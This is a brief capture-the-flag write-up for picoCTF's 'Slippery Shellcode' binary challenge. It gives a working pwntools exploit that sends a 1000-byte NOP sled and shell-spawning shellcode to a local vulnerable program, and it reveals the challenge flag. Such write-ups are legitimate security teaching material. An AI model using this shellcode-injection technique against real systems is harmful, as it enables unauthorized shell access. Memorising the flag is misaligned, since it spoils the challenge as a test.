# Slipper Shellcode (Binary)

![title](images/title.png)

After a ton of dumb trial and error I resorted to pwntools shellcraft and a giant NOP sled. Overcomplicated this easy one. POC below

```python
#!/usr/bin/env python

from pwn import *

p = process('./vuln')
e = ELF('./vuln')

sled = '\x90'*1000
p.sendlineafter('\n', sled + asm(shellcraft.i386.linux.sh()))
p.interactive()

```


<details>
	<summary>Flag</summary>

picoCTF{sl1pp3ry_sh311c0d3_baa99b74}
</details>